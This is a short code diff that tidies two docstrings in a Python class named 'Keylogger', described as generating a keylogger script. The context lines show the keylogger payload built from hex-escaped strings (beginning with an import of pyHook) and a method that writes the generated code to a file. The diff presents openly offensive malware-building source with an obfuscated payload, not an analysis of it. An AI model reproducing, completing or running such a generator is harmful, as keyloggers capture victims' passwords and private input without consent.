@@ -1,5 +1,5 @@
 class Keylogger(object):
-    '''Generates a keylogger script'''
+    '''Generates a keylogger script.'''
     def __init__(self):
         self.code = "\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x48\x6f\x6f\x6b\x0d"
         self.code += "\x0a\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x74\x68"
@@ -57,7 +57,7 @@ class Keylogger(object):
             print(error)
 
     def save(self, filename):
-        '''creates a file and writes the source code'''
+        '''Creates a file and writes the source code.'''
         with open(filename, 'w') as source:
             source.write(self.code)
             source.close()
